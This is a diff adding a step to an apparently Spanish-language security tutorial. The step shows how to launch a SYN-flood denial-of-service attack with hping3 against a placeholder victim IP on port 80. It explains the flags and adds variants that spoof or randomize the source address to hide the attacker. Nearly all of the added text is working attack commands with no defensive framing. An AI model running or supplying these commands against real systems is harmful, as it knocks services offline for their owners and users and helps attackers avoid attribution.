@@ -70,3 +70,17 @@
 apt-get install hping3
 ```
 </b>
+
+- <b>Paso 2</b>: Podemos realizar un ataque muy sencillo de tipo DDoS con el comando:
+<b>
+
+```
+hping3 -p 80  -S --flood [ip_victima]
+```
+</b>
+Se puede comprobar que <b>-p</b> es utilizado para determinar el puerto, que <b>-S</b> activa la flag SYN del paquete TCP-IP, y que <b>--flood</b> indica que el envío de paquetes se realizará de la manera más rápida posible.
+
+```
+hping3 -a [ip_atacante_falsa] -p 80  -S --flood [ip_victima] # IP de origen encubierta
+hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada aleatoriamente
+```
